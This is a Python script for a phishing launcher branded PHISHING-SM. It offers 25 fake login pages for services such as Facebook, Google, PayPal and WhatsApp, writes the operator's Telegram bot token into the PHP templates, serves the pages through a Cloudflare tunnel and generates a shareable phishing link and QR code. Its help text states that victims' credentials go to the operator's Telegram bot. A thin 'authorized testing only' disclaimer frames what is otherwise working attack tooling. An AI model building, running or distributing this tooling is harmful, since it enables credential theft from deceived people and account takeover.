#!/usr/bin/env python3
"""
PHISHING-SM Tool - Advanced Cloudflared Edition
Educational penetration testing tool for authorized security testing only
"""

import os
import sys
import time
import socket
import subprocess
import threading
import requests
import re
import signal
import platform
import tempfile
import shutil
import atexit
from pathlib import Path
from urllib.parse import urlparse

# ======================== COLOR CODES ========================
class Colors:
    RED = '\033[1;91m'
    GREEN = '\033[1;92m'
    YELLOW = '\033[1;93m'
    BLUE = '\033[1;94m'
    PURPLE = '\033[1;95m'
    CYAN = '\033[1;96m'
    WHITE = '\033[1;97m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_BLUE = '\033[44m'
    BG_YELLOW = '\033[43m'
    BG_PURPLE = '\033[45m'
    NC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# ======================== MAIN TOOL CLASS ========================
class PhishingTool:
    def __init__(self):
        self.current_token = ""
        self.user_id = ""
        self.selected_page = ""
        self.php_port = 8080
        self.php_process = None
        self.cloudflared_process = None
        self.tunnel_url = ""
        self.modified_files = []          # list of (file_path, backup_path)
        self.services_running = False
        self.is_termux = self.detect_termux()
        self.is_kali = self.detect_kali()
        self.original_dir = os.getcwd()
        
        # Available phishing pages (same as original but extended)
        self.pages = {
            "1": "amazon.php",
            "2": "camera.php",
            "3": "collection.php",
            "4": "copy.php",
            "5": "discord.php",
            "6": "facebook.php",
            "7": "freefire.php",
            "8": "github.php",
            "9": "google.php",
            "10": "instagram.php",
            "11": "location.php",
            "12": "microsoft.php",
            "13": "netflix.php",
            "14": "paypal.php",
            "15": "peace.php",
            "16": "pupgmobile.php",
            "17": "record.php",
            "18": "roblox.php",
            "19": "snab.php",
            "20": "spotify.php",
            "21": "telegram.php",
            "22": "tiktok.php",
            "23": "whatsapp.php",
            "24": "x.php",
            "25": "yallalido.php"
        }
        
        # Register cleanup on exit
        atexit.register(self.cleanup)
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    # ------------------------ SYSTEM DETECTION ------------------------
    def detect_termux(self):
        """Detect if running in Termux environment"""
        return 'com.termux' in os.environ.get('PREFIX', '') or \
               '/data/data/com.termux' in os.environ.get('PATH', '') or \
               os.path.exists('/data/data/com.termux')

    def detect_kali(self):
        """Detect if running on Kali Linux"""
        try:
            with open('/etc/os-release', 'r') as f:
                content = f.read().lower()
                return 'kali' in content
        except:
            return False

    # ------------------------ DEPENDENCY MANAGEMENT ------------------------
    def print_banner(self):
        """Display enhanced banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ ███████╗██████╗   ║
║  ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ ██╔════╝██╔══██╗  ║
║  ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝  ║
║  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗  ║
║  ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝███████╗██║  ██║  ║
║  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝  ║
║                                                                              ║
║                    ███████╗███╗   ███╗  ██████╗███████╗                     ║
║                    ██╔════╝████╗ ████║ ██╔════╝██╔════╝                     ║
║                    █████╗  ██╔████╔██║ ██║     █████╗                       ║
║                    ██╔══╝  ██║╚██╔╝██║ ██║     ██╔══╝                       ║
║                    ██║     ██║ ╚═╝ ██║ ╚██████╗███████╗                     ║
║                    ╚═╝     ╚═╝     ╚═╝  ╚═════╝╚══════╝                     ║
║                                                                              ║
║                      {Colors.YELLOW}ADVANCED CLOUDFLARED EDITION{Colors.CYAN}                          ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.NC}
        """
        print(banner)
        self.print_info_box("TOOL INFORMATION", [
            f"Tool      : PHISHING-SM Cloudflared Edition",
            f"Version   : 2.0",
            f"Coder     : @A_Y_TR",
            f"Channel   : https://t.me/cybersecurityTemSM",
            f"OS        : {'Termux' if self.is_termux else 'Kali' if self.is_kali else platform.system()}"
        ], Colors.BG_BLUE)
        self.print_warning("The developer is not responsible for any incorrect use of the tool...")
        self.print_warning("phishing tool..💉👻")
        self.print_success("All rights reserved: Mohamed Abu Al-Saud")
        print()

    def print_info_box(self, title, lines, bg_color=Colors.BG_BLUE):
        """Print a styled information box"""
        print(f"{bg_color}{Colors.WHITE}══════════════════════════ {title} ══════════════════════════{Colors.NC}")
        for line in lines:
            print(f"{Colors.CYAN}[+] {Colors.WHITE}{line}{Colors.NC}")
        print(f"{bg_color}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")

    def print_success(self, msg):
        print(f"{Colors.GREEN}[✓] {msg}{Colors.NC}")

    def print_error(self, msg):
        print(f"{Colors.RED}[✗] {msg}{Colors.NC}")

    def print_warning(self, msg):
        print(f"{Colors.YELLOW}[!] {msg}{Colors.NC}")

    def print_info(self, msg):
        print(f"{Colors.CYAN}[+] {msg}{Colors.NC}")

    def check_command(self, cmd):
        """Check if a command exists in PATH"""
        return shutil.which(cmd) is not None

    def install_cloudflared(self):
        """Install cloudflared based on detected OS"""
        self.print_info("Installing cloudflared tunnel...")
        
        # If already installed, just return
        if self.check_command('cloudflared'):
            self.print_success("cloudflared is already installed")
            return True
        
        try:
            if self.is_termux:
                # Termux installation
                self.print_info("Detected Termux environment")
                subprocess.run(['pkg', 'update', '-y'], check=True, capture_output=True)
                subprocess.run(['pkg', 'install', 'cloudflared', '-y'], check=True, capture_output=True)
                
            elif self.is_kali or platform.system() == 'Linux':
                # Kali / generic Linux
                self.print_info("Detected Linux/Kali environment")
                # Try apt first
                if self.check_command('apt'):
                    subprocess.run(['apt', 'update', '-y'], check=True, capture_output=True)
                    subprocess.run(['apt', 'install', 'cloudflared', '-y'], check=True, capture_output=True)
                else:
                    # Manual download (latest amd64)
                    self.print_info("Downloading cloudflared binary...")
                    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
                    subprocess.run(['curl', '-L', '-o', '/tmp/cloudflared', url], check=True)
                    subprocess.run(['chmod', '+x', '/tmp/cloudflared'], check=True)
                    subprocess.run(['sudo', 'mv', '/tmp/cloudflared', '/usr/local/bin/'], check=True)
            else:
                self.print_error("Unsupported OS for automatic installation")
                self.print_warning("Please install cloudflared manually from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/")
                return False
            
            # Verify installation
            if self.check_command('cloudflared'):
                self.print_success("cloudflared installed successfully")
                return True
            else:
                self.print_error("cloudflared installation failed")
                return False
                
        except subprocess.CalledProcessError as e:
            self.print_error(f"Installation failed: {e}")
            return False
        except Exception as e:
            self.print_error(f"Unexpected error during installation: {e}")
            return False

    def check_php(self):
        """Check if PHP is installed, try to install if missing"""
        if self.check_command('php'):
            self.print_success("PHP is available")
            return True
        
        self.print_warning("PHP not found. Attempting installation...")
        try:
            if self.is_termux:
                subprocess.run(['pkg', 'install', 'php', '-y'], check=True)
            elif self.check_command('apt'):
                subprocess.run(['apt', 'install', 'php', '-y'], check=True)
            else:
                self.print_error("Cannot install PHP automatically")
                return False
            return self.check_command('php')
        except:
            return False

    def check_dependencies(self):
        """Verify all required dependencies"""
        self.print_info("Checking dependencies...")
        
        if not self.check_php():
            self.print_error("PHP is required but could not be installed")
            return False
        
        if not self.install_cloudflared():
            self.print_error("cloudflared is required but could not be installed")
            return False
        
        # Optional but nice
        if not self.check_command('curl'):
            self.print_warning("curl not found, some features may be limited")
        
        self.print_success("All dependencies are ready")
        return True

    # ------------------------ TOKEN MANAGEMENT ------------------------
    def validate_token(self, token):
        """Validate Telegram bot token format"""
        return bool(re.match(r'^[0-9]{8,10}:[a-zA-Z0-9_-]{35,}$', token))

    def validate_id(self, user_id):
        """Validate Telegram user ID"""
        return user_id.isdigit() and len(user_id) >= 5

    def backup_and_replace_token(self, token):
        """Create backups of PHP files and replace token placeholder"""
        self.print_info("Replacing token in PHP files...")
        php_files = list(Path('.').glob('*.php'))
        if not php_files:
            self.print_warning("No PHP files found in current directory")
            return False
        
        modified_count = 0
        for php_file in php_files:
            try:
                with open(php_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                if 'BBOTTTTTTTTTTT' in content:
                    # Create backup
                    backup_path = php_file.with_suffix('.php.bak')
                    shutil.copy2(php_file, backup_path)
                    self.modified_files.append((php_file, backup_path))
                    
                    # Replace token
                    new_content = content.replace('BBOTTTTTTTTTTT', token)
                    with open(php_file, 'w', encoding='utf-8') as f:
                        f.write(new_content)
                    
                    self.print_success(f"Updated: {php_file}")
                    modified_count += 1
            except Exception as e:
                self.print_error(f"Error processing {php_file}: {e}")
        
        if modified_count == 0:
            self.print_warning("No placeholder 'BBOTTTTTTTTTTT' found in any PHP file")
            return False
        
        self.print_success(f"Token replaced in {modified_count} file(s)")
        self.current_token = token
        return True

    def revert_all_tokens(self):
        """Restore all backed up PHP files"""
        if not self.modified_files:
            self.print_info("No token changes to revert")
            return
        
        self.print_info("Reverting tokens in PHP files...")
        for original, backup in self.modified_files:
            try:
                if backup.exists():
                    shutil.copy2(backup, original)
                    backup.unlink()
                    self.print_success(f"Restored: {original}")
            except Exception as e:
                self.print_error(f"Failed to restore {original}: {e}")
        
        self.modified_files.clear()
        self.current_token = ""

    # ------------------------ SERVICE MANAGEMENT ------------------------
    def is_port_available(self, port):
        """Check if a port is free"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                return s.connect_ex(('127.0.0.1', port)) != 0
        except:
            return True

    def kill_process_on_port(self, port):
        """Kill process using a specific port (Linux only)"""
        try:
            result = subprocess.run(f"lsof -ti:{port}", shell=True, capture_output=True, text=True)
            if result.stdout.strip():
                pids = result.stdout.strip().split()
                for pid in pids:
                    os.kill(int(pid), signal.SIGTERM)
                    self.print_info(f"Killed process {pid} using port {port}")
                time.sleep(1)
        except:
            pass

    def start_php_server(self):
        """Start PHP built-in server on port 8080"""
        self.print_info(f"Starting PHP server on 127.0.0.1:{self.php_port}")
        
        # Ensure port is free
        if not self.is_port_available(self.php_port):
            self.print_warning(f"Port {self.php_port} is busy, attempting to free it...")
            self.kill_process_on_port(self.php_port)
            time.sleep(2)
            if not self.is_port_available(self.php_port):
                self.print_error(f"Port {self.php_port} is still busy. Please free it manually.")
                return False
        
        try:
            # Start PHP server
            self.php_process = subprocess.Popen(
                ['php', '-S', f'127.0.0.1:{self.php_port}'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid if os.name == 'posix' else None
            )
            
            # Wait for server to start
            time.sleep(3)
            if self.is_port_available(self.php_port):
                self.print_error("PHP server failed to start")
                return False
            
            self.print_success(f"PHP server running on http://127.0.0.1:{self.php_port}")
            
            # Test page access
            test_url = f"http://127.0.0.1:{self.php_port}/{self.selected_page}"
            try:
                resp = requests.get(test_url, timeout=5)
                if resp.status_code == 200:
                    self.print_success(f"Page {self.selected_page} is accessible")
                else:
                    self.print_warning(f"Page returned status {resp.status_code}")
            except:
                self.print_warning("Could not verify page accessibility")
            
            return True
        except Exception as e:
            self.print_error(f"Failed to start PHP server: {e}")
            return False

    def start_cloudflared_tunnel(self):
        """Start cloudflared tunnel and capture public URL"""
        self.print_info("Starting cloudflared tunnel...")
        
        # Kill any existing cloudflared processes
        subprocess.run('pkill -f cloudflared', shell=True, capture_output=True)
        time.sleep(1)
        
        try:
            # Start cloudflared process
            self.cloudflared_process = subprocess.Popen(
                ['cloudflared', 'tunnel', '--url', f'http://localhost:{self.php_port}'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True,
                preexec_fn=os.setsid if os.name == 'posix' else None
            )
            
            # Thread to capture URL from stderr
            url_pattern = re.compile(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com')
            self.tunnel_url = None
            
            def capture_url():
                for line in iter(self.cloudflared_process.stderr.readline, ''):
                    if not line:
                        break
                    match = url_pattern.search(line)
                    if match and not self.tunnel_url:
                        self.tunnel_url = match.group()
                        self.print_success(f"Tunnel URL: {self.tunnel_url}")
                    # Also print cloudflared logs in debug mode? skip for cleanliness
            
            thread = threading.Thread(target=capture_url, daemon=True)
            thread.start()
            
            # Wait for URL (max 30 seconds)
            for _ in range(30):
                if self.tunnel_url:
                    # Save to file
                    with open('tunnel_url.txt', 'w') as f:
                        f.write(self.tunnel_url)
                    return True
                time.sleep(1)
            
            self.print_error("Could not obtain tunnel URL within timeout")
            return False
            
        except Exception as e:
            self.print_error(f"Failed to start cloudflared: {e}")
            return False

    def generate_phishing_url(self):
        """Generate final phishing URL with parameters"""
        if not self.tunnel_url:
            self.print_error("No tunnel URL available")
            return None
        
        final_url = f"{self.tunnel_url}/{self.selected_page}?ID={self.user_id}"
        self.print_info_box("GENERATED PHISHING URL", [final_url], Colors.BG_GREEN)
        
        # Save URL
        with open('phishing_url.txt', 'w') as f:
            f.write(final_url)
        
        # Generate QR code if qrencode available
        if self.check_command('qrencode'):
            self.print_info("QR Code:")
            subprocess.run(['qrencode', '-t', 'ANSIUTF8', final_url])
        else:
            self.print_warning("Install qrencode for QR code support (optional)")
        
        return final_url

    # ------------------------ INTERACTIVE MENUS ------------------------
    def show_pages_menu(self):
        """Display available phishing pages"""
        self.print_info_box("AVAILABLE PAGES", [], Colors.BG_BLUE)
        
        # Create two-column layout
        items = list(self.pages.items())
        max_name = max(len(p.replace('.php', '')) for p in self.pages.values())
        
        for i in range(0, len(items), 2):
            line = f"{Colors.CYAN}│{Colors.NC} "
            # First column
            num1, page1 = items[i]
            name1 = page1.replace('.php', '').title()
            line += f"{Colors.GREEN}[{num1:>2}]{Colors.WHITE} {name1:<{max_name}} {Colors.CYAN}│{Colors.NC} "
            # Second column if exists
            if i+1 < len(items):
                num2, page2 = items[i+1]
                name2 = page2.replace('.php', '').title()
                line += f"{Colors.GREEN}[{num2:>2}]{Colors.WHITE} {name2:<{max_name}} {Colors.CYAN}│{Colors.NC}"
            else:
                line += f"{' ' * (max_name + 6)} {Colors.CYAN}│{Colors.NC}"
            print(line)
        
        # Help and exit options
        print(f"{Colors.CYAN}│{Colors.NC} {Colors.GREEN}[26]{Colors.WHITE} {'Help':<{max_name}} {Colors.CYAN}│{Colors.NC} {Colors.GREEN}[00]{Colors.WHITE} {'Exit':<{max_name}} {Colors.CYAN}│{Colors.NC}")
        print(f"{Colors.CYAN}└{'─' * (max_name * 2 + 20)}┘{Colors.NC}")

    def show_help(self):
        """Display comprehensive help"""
        os.system('clear')
        self.print_banner()
        self.print_info_box("HELP & INFORMATION", [], Colors.BG_PURPLE)
        help_text = f"""
{Colors.WHITE}This tool is designed for educational and authorized penetration testing only.

{Colors.CYAN}How it works:{Colors.WHITE}
1. Starts PHP server on localhost:8080
2. Launches Cloudflared tunnel to create a public HTTPS URL
3. Generates phishing page with your Telegram bot integration
4. Victim credentials are sent directly to your Telegram bot

{Colors.CYAN}Requirements:{Colors.WHITE}
- PHP (auto-installed if missing)
- Cloudflared (auto-installed)
- Internet connection
- Telegram Bot Token (from @BotFather)
- Your Telegram User ID (from @userinfobot)

{Colors.CYAN}Legal Warning:{Colors.RED}
⚠️  Use only on systems you own or have explicit permission to test
⚠️  Unauthorized access is illegal and punishable by law
⚠️  Developer assumes no liability for misuse
        """
        print(help_text)
        input(f"\n{Colors.YELLOW}Press Enter to return to main menu...{Colors.NC}")

    def control_panel(self):
        """Interactive control panel while services are running"""
        self.services_running = True
        self.print_success("Services are now running!")
        
        while self.services_running:
            print(f"\n{Colors.BG_PURPLE}{Colors.WHITE}══════════════════════════ CONTROL PANEL ══════════════════════════{Colors.NC}")
            print(f"{Colors.CYAN}Status:{Colors.WHITE} PHP: running on port {self.php_port} | Cloudflared: active")
            if self.tunnel_url:
                print(f"{Colors.CYAN}Tunnel:{Colors.WHITE} {self.tunnel_url}")
            print(f"{Colors.YELLOW}Commands:{Colors.WHITE} [q]uit [u]rl [r]efresh [s]tatus [qr] [h]elp")
            print(f"{Colors.BG_PURPLE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
            
            choice = input(f"{Colors.GREEN}[+]{Colors.NC} Command: ").strip().lower()
            
            if choice == 'q':
                self.print_info("Stopping services...")
                self.services_running = False
                break
            elif choice == 'u':
                if Path('phishing_url.txt').exists():
                    with open('phishing_url.txt', 'r') as f:
                        print(f"{Colors.GREEN}Phishing URL: {f.read().strip()}{Colors.NC}")
                else:
                    self.print_error("No URL generated yet")
            elif choice == 'r':
                self.print_info("Refreshing...")
                # Check if processes are alive
                if self.php_process and self.php_process.poll() is not None:
                    self.print_error("PHP server has stopped!")
                    self.services_running = False
                    break
                if self.cloudflared_process and self.cloudflared_process.poll() is not None:
                    self.print_error("Cloudflared tunnel has stopped!")
                    self.services_running = False
                    break
                self.print_success("Services are running")
            elif choice == 's':
                self.print_info_box("CURRENT STATUS", [
                    f"PHP Server: {'Running' if self.php_process and self.php_process.poll() is None else 'Stopped'}",
                    f"Cloudflared: {'Running' if self.cloudflared_process and self.cloudflared_process.poll() is None else 'Stopped'}",
                    f"Tunnel URL: {self.tunnel_url or 'Not available'}",
                    f"Selected Page: {self.selected_page}",
                    f"Telegram ID: {self.user_id}"
                ], Colors.BG_BLUE)
            elif choice == 'qr':
                if Path('phishing_url.txt').exists():
                    with open('phishing_url.txt', 'r') as f:
                        url = f.read().strip()
                    if self.check_command('qrencode'):
                        subprocess.run(['qrencode', '-t', 'ANSIUTF8', url])
                    else:
                        self.print_warning("qrencode not installed")
                else:
                    self.print_error("No URL found")
            elif choice == 'h':
                self.show_help()
            else:
                self.print_error("Invalid command")
            
            # Check process health
            if self.php_process and self.php_process.poll() is not None:
                self.print_error("PHP server died unexpectedly!")
                self.services_running = False
                break
            if self.cloudflared_process and self.cloudflared_process.poll() is not None:
                self.print_error("Cloudflared tunnel died unexpectedly!")
                self.services_running = False
                break

    # ------------------------ CLEANUP ------------------------
    def stop_services(self):
        """Stop all running services"""
        self.print_info("Stopping all services...")
        
        if self.php_process and self.php_process.poll() is None:
            try:
                os.killpg(os.getpgid(self.php_process.pid), signal.SIGTERM)
            except:
                self.php_process.terminate()
            self.php_process.wait(timeout=5)
            self.print_success("PHP server stopped")
        
        if self.cloudflared_process and self.cloudflared_process.poll() is None:
            try:
                os.killpg(os.getpgid(self.cloudflared_process.pid), signal.SIGTERM)
            except:
                self.cloudflared_process.terminate()
            self.cloudflared_process.wait(timeout=5)
            self.print_success("Cloudflared tunnel stopped")
        
        # Extra kill for any remaining processes
        subprocess.run('pkill -f "php -S"', shell=True, capture_output=True)
        subprocess.run('pkill -f cloudflared', shell=True, capture_output=True)

    def cleanup(self):
        """Full cleanup: stop services, revert tokens, remove temp files"""
        print(f"\n{Colors.YELLOW}[!] Cleaning up...{Colors.NC}")
        self.stop_services()
        self.revert_all_tokens()
        
        # Remove temporary files
        for f in ['tunnel_url.txt', 'phishing_url.txt', 'php_server.log']:
            if Path(f).exists():
                Path(f).unlink()
                self.print_info(f"Removed {f}")
        
        self.print_success("Cleanup complete. Goodbye!")

    def signal_handler(self, signum, frame):
        """Handle Ctrl+C gracefully"""
        self.print_warning("Interrupt received, shutting down...")
        self.cleanup()
        sys.exit(0)

    # ------------------------ MAIN EXECUTION ------------------------
    def run(self):
        """Main program flow"""
        try:
            self.print_banner()
            
            # Ensure we are in the correct directory (where PHP files exist)
            if not list(Path('.').glob('*.php')):
                self.print_error("No PHP phishing pages found in current directory!")
                self.print_warning("Please place the tool in a directory containing the PHP templates.")
                return
            
            # Check dependencies
            if not self.check_dependencies():
                self.print_error("Failed to meet dependencies. Exiting.")
                return
            
            # Main loop for token and ID input
            while True:
                self.print_info_box("TELEGRAM BOT SETUP", [], Colors.BG_BLUE)
                
                # Bot token
                while True:
                    token = input(f"{Colors.YELLOW}[+] Enter Telegram Bot Token: {Colors.NC}").strip()
                    if self.validate_token(token):
                        self.print_success("Token format accepted")
                        break
                    self.print_error("Invalid token format. Expected: 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789")
                
                # User ID
                while True:
                    uid = input(f"{Colors.YELLOW}[+] Enter Your Telegram User ID: {Colors.NC}").strip()
                    if self.validate_id(uid):
                        self.print_success("User ID accepted")
                        break
                    self.print_error("User ID must be numeric and at least 5 digits")
                
                # Replace token in PHP files
                if not self.backup_and_replace_token(token):
                    self.print_warning("No token placeholder found. Continue anyway? (y/n)")
                    if input().lower() != 'y':
                        continue
                
                self.user_id = uid
                
                # Page selection
                self.show_pages_menu()
                while True:
                    choice = input(f"{Colors.YELLOW}[+] Choose page [1-25] or 26=Help, 00=Exit: {Colors.NC}").strip()
                    if choice == '00':
                        self.cleanup()
                        return
                    elif choice == '26':
                        self.show_help()
                        self.print_banner()
                        self.show_pages_menu()
                        continue
                    elif choice in self.pages:
                        self.selected_page = self.pages[choice]
                        self.print_success(f"Selected: {self.selected_page}")
                        break
                    else:
                        self.print_error("Invalid choice")
                
                # Verify page exists
                if not Path(self.selected_page).exists():
                    self.print_error(f"Page file {self.selected_page} not found!")
                    continue
                
                # Start services
                if not self.start_php_server():
                    continue
                
                if not self.start_cloudflared_tunnel():
                    self.stop_services()
                    continue
                
                # Generate final URL
                final_url = self.generate_phishing_url()
                if not final_url:
                    self.stop_services()
                    continue
                
                # Enter control panel
                self.control_panel()
                
                # After control panel exits, ask to restart or quit
                print()
                again = input(f"{Colors.YELLOW}Do you want to start another session? (y/n): {Colors.NC}").strip().lower()
                if again != 'y':
                    break
                else:
                    # Reset for new session
                    self.stop_services()
                    self.revert_all_tokens()
                    continue
            
            self.cleanup()
            
        except Exception as e:
            self.print_error(f"Fatal error: {e}")
            self.cleanup()

# ======================== ENTRY POINT ========================
def main():
    tool = PhishingTool()
    tool.run()

if __name__ == "__main__":
    main()
